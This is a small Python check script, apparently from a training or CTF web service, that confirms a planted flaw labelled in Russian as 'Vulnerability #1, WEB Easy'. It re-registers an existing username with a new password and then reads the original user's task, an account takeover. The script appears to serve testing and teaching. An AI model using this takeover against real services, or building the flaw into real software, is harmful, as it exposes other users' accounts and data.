from lib import *

print('[CHECK] 3. [Уязвимость №1, WEB Easy] Можно зарегаться заново под существующим юзером с новым паролем')
s = requests.Session()
username = random_alphanumeric_string(25)
password = random_alphanumeric_string(25)

register(s, username, password)
login(s, username, password)
task_id = new_task(s, 'helloasdasdf', 'goodbye9289239')

# new session from zero
s = requests.Session()
register(s, username, 'newpasscursed')
login(s, username, 'newpasscursed')
task_cont = get_task_detailed(s, task_id)
if 'helloasdasdf' in task_cont and 'goodbye9289239' in task_cont:
    print('[PASSED] 3. [Уязвимость №1, WEB Easy] Можно зарегаться заново под существующим юзером с новым паролем')
else:
    print('[FAIL]')
